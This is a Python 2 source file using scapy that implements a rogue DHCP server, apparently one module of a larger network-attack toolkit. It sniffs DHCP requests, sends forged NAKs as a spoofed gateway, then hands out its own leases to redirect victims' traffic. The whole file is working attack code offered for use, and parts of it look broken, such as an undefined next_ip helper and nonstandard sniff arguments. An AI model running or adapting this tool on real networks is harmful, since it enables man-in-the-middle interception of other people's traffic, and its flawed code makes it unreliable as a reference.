import stream, util
import logging
from threading import Thread
from scapy.all import *

#
# Set up a rogue DHCP server and hand out IP addresses.
#
class DHCPSpoof:
	def __init__(self):
		self.local_mac = get_if_hwaddr(conf.iface)
		self.local_ip = ''
		self.spoofed_hosts = []
		self.curr_ip = None
		self.running = False
		self.gateway = None
		self.net_mask = None

	def initialize(self):
		try:
			self.gateway = raw_input('[!] Enter (spoofed) gateway: ')
			self.net_mask = raw_input('[!] Enter netmask to hand IPs out from: ')
			tmp = raw_input('[!] Forward all traffic to %s.  Assign IP\'s from %s.  Is this correct? '%(self.gateway,self.net_mask))
			if tmp == 'n':
				return False
			print '[+] Configuring rogue DHCP server..'
			thread = Thread(target=self.netsniff)
			thread.start()
			self.running = True
			return True
		except Exception, j:
			print '[-] Error: ', j
			return False
	
	#
	#
	#
	def netsniff(self):
		sniff(prn=self.pkt_handler,store=0,stopper=self.test_stop,stopperTimeout=5)

	#
	#
	#
	def pkt_handler(self, pkt):
		# first test if this is a DHCPREQ
		if self.running and DHCP in pkt:
			print '[-] Rogue DHCP caught DHCP packet.'			
			for opt in pkt[DHCP].options:
				# if the option is a REQUEST
				if type(opt) is tuple and opt[1] == 3:
					print '[dbg] Got DHCP request, spoofing...'
					# NAK the host
					fam,hw = get_if_raw_hwaddr(conf.iface)
					nak = Ether(dst=pkt[Ether].src)/IP(src=self.gateway)
					nak /= UDP(sport=68,dport=67)/BOOTP(chaddr=hw)/DHCP(options=[('message-type','nak'),'end'])
					send(nak, loop=False)
					#sr(nak, count=1)
					# if we haven't handed out any IP's yet, set the first one and hand it out
					if self.curr_ip is None:
						self.curr_ip = self.net_mask.split('/')[0] 
					else:
						# else get the next IP address
						self.curr_ip = next_ip(self.curr_ip)
					# now send our IP lease
					lease = Ether(dst=pkt[Ether].src)/UDP(sport=68,dport=67)
					lease /= BOOTP(chaddr=hw,yiaddr=self.curr_ip)/DHCP(options=[('message-type','ack'),'end'])
					send(lease, loop=False)
					#sr(lease, count=1)
					print '[dbg] just handed \'%s\' out to \'%s\''%(self.curr_ip, pkt[Ether].src)
					self.spoofed_hosts.append(pkt[IP].src)
	#
	#
	#
	def test_stop(self):
		if self.running:
			return False
		print '[dbg] stopping dhcp threads'
		return True

	#
	#
	#
	def shutdown(self):
		self.running = False
		print '[!] DHCP server shutdown.'
